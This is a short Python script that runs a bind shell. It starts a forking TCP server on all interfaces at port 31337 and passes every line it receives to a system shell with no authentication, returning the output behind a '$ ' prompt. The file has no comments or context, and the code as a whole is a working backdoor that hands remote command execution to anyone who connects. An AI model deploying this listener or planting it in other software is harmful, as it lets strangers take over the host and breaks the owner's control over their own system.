import SocketServer
import subprocess

def parse_cmd(cmd):
    cmd = cmd.split(' ')
    return subprocess.check_output(cmd[0], shell=True)

class Server(SocketServer.ForkingMixIn, 
        SocketServer.TCPServer): 
    allow_reuse_address = True
    request_queue_size = 1024
        

class Handler(SocketServer.BaseRequestHandler):

    def handle(self):
        shell = True
        while shell:
            self.request.sendall('$ ')
            output = parse_cmd(self.request.recv(1024))
            self.request.sendall(output)

if __name__ == '__main__':

    HOST, PORT = "0.0.0.0", 31337

    server = Server((HOST, PORT), Handler)
    server.serve_forever()
